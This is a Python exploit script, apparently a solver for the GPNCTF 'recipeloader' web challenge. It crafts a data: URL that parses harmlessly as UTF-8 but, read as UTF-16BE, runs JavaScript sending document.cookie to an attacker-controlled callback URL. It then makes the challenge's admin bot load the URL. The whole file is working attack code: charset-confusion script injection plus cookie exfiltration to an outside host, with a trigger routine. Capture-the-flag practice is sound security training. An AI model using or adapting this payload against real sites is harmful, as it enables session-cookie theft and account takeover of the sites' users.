#!/usr/bin/env python3
import argparse
import re
import sys
import urllib.parse
import urllib.request


def build_data_url(exfil_url: str) -> str:
    """
    Build a data: script that has two different interpretations:
      * fetch(...).text() decodes bytes as UTF-8 -> recipe="..."; accepted by Acorn.
      * <script src=data:text/javascript;charset=utf-16be,...> decodes bytes as UTF-16BE
        -> a label followed by fetch(`<exfil>?c=${encodeURIComponent(document.cookie)}`)//
    """
    exfil_url = exfil_url.rstrip('/')
    js = f":fetch(`{exfil_url}?c=${{encodeURIComponent(document.cookie)}}`)//"
    raw = b'recipe="' + js.encode('utf-16-be') + b'";'
    return 'data:text/javascript;charset=utf-16be,' + urllib.parse.quote_from_bytes(raw, safe='')


def build_urls(base_url: str, exfil_url: str):
    base = base_url.rstrip('/')
    data_url = build_data_url(exfil_url)
    # This is the URL the admin bot must visit internally. It satisfies admin.js:
    # targetUrl.startsWith('http://localhost:1337')
    internal_target = 'http://localhost:1337/?url=' + urllib.parse.quote(data_url, safe='')
    trigger_url = base + '/bot/run?url=' + urllib.parse.quote(internal_target, safe='')
    return data_url, internal_target, trigger_url


def trigger(trigger_url: str, timeout: int = 20):
    req = urllib.request.Request(trigger_url, headers={'User-Agent': 'recipeloader-solver'})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        body = r.read().decode('utf-8', 'replace')
        return r.status, body


def main():
    ap = argparse.ArgumentParser(description='GPNCTF recipeloader exploit URL generator/trigger')
    ap.add_argument('base_url', help='external challenge base URL, e.g. https://wood-fired-...gpn24.ctf.kitctf.de')
    ap.add_argument('exfil_url', help='public HTTPS callback URL you control, e.g. https://webhook.site/<uuid>')
    ap.add_argument('--trigger', action='store_true', help='send GET /bot/run to the challenge')
    ap.add_argument('--timeout', type=int, default=20)
    args = ap.parse_args()

    data_url, internal_target, trigger_url = build_urls(args.base_url, args.exfil_url)

    print('[+] data_url length:', len(data_url))
    print('[+] internal bot target:')
    print(internal_target)
    print('[+] trigger URL:')
    print(trigger_url)
    print('[+] expected callback format:')
    print(args.exfil_url.rstrip('/') + '?c=flagGPNCTF%7B...%7D')

    if args.trigger:
        print('[+] triggering bot...')
        status, body = trigger(trigger_url, args.timeout)
        print('[+] HTTP status:', status)
        print('[+] response body:', body[:500])
        if body.strip() == 'ok':
            print('[+] bot accepted target. Check your callback server/webhook for c=flagGPNCTF{...}')
        elif 'invalid url' in body:
            print('[-] bot rejected the internal URL; check URL encoding')
            sys.exit(2)


if __name__ == '__main__':
    main()
